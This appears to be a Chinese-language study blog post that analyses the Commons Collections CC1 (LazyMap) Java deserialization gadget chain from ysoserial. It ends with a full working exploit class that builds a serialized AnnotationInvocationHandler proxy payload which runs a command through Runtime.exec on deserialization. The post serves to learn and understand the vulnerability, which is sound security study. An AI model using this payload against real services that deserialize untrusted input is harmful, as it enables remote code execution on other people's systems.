# Java 反序列化之 CC1
这一篇还是记录一下 ysoserial 的正版 CC1！

**前置知识：**

1. 动态代理
2. 正版cc1


## 正版 CC1 链分析

### 1.寻找链尾的 exec 方法

- 漏洞点还是 `InvokerTransformer#transform()`，在该方法处进行 find usages 操作。

> 上一篇说的是 TransformedMap 的链子，今天则是正版 CC1 链里面的 LazyMap 链子

然后发现`LazyMap#get()`调用了 `transform()` 方法！


### 2.寻找链子

`get()`中的 `factory` 调用了 transform() ，所以现在去找 `factory` 是什么。


追踪发现，`factory` 是 LazyMap 的一个成员变量（protected），同时 LazyMap 的 `decorate()` 静态方法可以实例化一个 LazyMap 类对象，并且可以控制 `factory` 的值。

 为什么关注decorate()方法呢？因为 LazyMap 的构造函数是 `private`，所以无法直接获取，而 `decorate()` 最后可以实例化一个`LazyMap` 对象。继续寻找谁调用了get()方法。

最终在 `AnnotationInvocationHandler.invoke()` 方法中找到了有一个地方调用了 `get()` 方法。 

> 过于夸张，一共有2871个结果，不知道漏洞的发现者到底是如何找到这条链的。。。如果沒有找到 AnnotationInvocationHandler 的话，可以按住 ctrl+shift+r 开启全局搜索 AnnotationInvocationHandler

同时这个类也非常好，它里面有 `readObject()` 方法，可以作为我们的入口类。

最后的问题是怎样通过 `readObject()` 触发 `invoke()`？

需要触发 `invoke()` 方法，马上想到动态代理，一个类被动态代理了之后，当通过代理调用该类方法时，会自动调用对应的调用处理器的 `invoke()` 方法。

**readObject()中有什么方法和动态代理相关吗？**


 `readObject()` 中调用了 `memberValues.entrySet()` 方法。也就是说，如果我们将 `memberValues` 的值改为动态代理类实例，那么当调用entrySet()时就会自动执行调用处理器的 `invoke()` 方法了，这样就完成了整条链子的调用。

**最终的 exp 如下，建议反复观摩学习🤭**

```java
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

// 正版 CC1 链最终 EXP
public class Main {

        public static void main(String[] args) throws Exception{

                Transformer[] transformers = new Transformer[]{
                        new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                        new InvokerTransformer("getMethod",
                                new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                        new InvokerTransformer("invoke"
                                , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
                };

                ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
                HashMap<Object, Object> hashMap = new HashMap<>();
                Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

                // 通过反射实例化一个 AnnocationInvocationHandler 类对象
                Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
                Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
                declaredConstructor.setAccessible(true);
                InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorateMap);

                //生成动态代理类对象
                Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()
                        , new Class[]{Map.class}, invocationHandler);

                // 实例化一个 AnnotationInvocationHandler 类对象并进行序列化，之后反序列化时就会调用到 AnnotationInvocationHandler 类的 readObject 方法
                InvocationHandler invocationHandler1 = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);

                serialize(invocationHandler1);
                unserialize("ser.bin");


        }
        public static void serialize(Object obj) throws IOException {
                ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
                oos.writeObject(obj);
        }
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
                ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
                Object obj = ois.readObject();
                return obj;
        }

}

```

~~EXP 最后又新建了一个 InvocationHandler1 实例并将这个实例反序列化，这一步目前真的不明白。~~

>再一次学习动态代理后我大概理解了 exp 的操作，反序列化后会调用 invocationHandler1 的 readObject() 方法，而 invocationHandler1 的 memberValues 传入的是一个代理类对象 proxyMap，所以在AnnotationInvocationHandler 类的 444 行调用 memberValues.entrySet() 方法时调用的是 proxyMap.entrySet() ，根据动态代理相关知识，这里会自动调用和这个 proxyMap 相关联的调用处理器的 invoke() 方法。
和 proxyMap 相关联的调用处理器是 invocationHandler，所以会调用 invocationHandler 的 invoke() 方法，而 invocationHandler 又是 AnnotationInvocationHandler 类对象，所以会调用该类的 invoke() 方法，最终在这个方法里面调用了 memberValues.get(member);
而此时的 memberValues 是 decorateMap，这样就接上了我们的链子。


1. 最后会调用到 LazyMap 的 get 方法，传入的参数值是 `entrySet`
2. 之后调用 factory.transfrom(key)，factory为 chainedTransformer，key 为 entryset
3. 上一步的 key 是 entryset ，经过 chainedTransformer 的 transform 方法转换之后 key 首先变成了 Runtime.class，之后就是变成 InvokerTransformer 命令执行所需的一系列对象，最终导致命令执行


## 参考链接

[芜风师傅](https://drun1baby.github.io/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/)

[ysoserial-CommonsCollections](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)

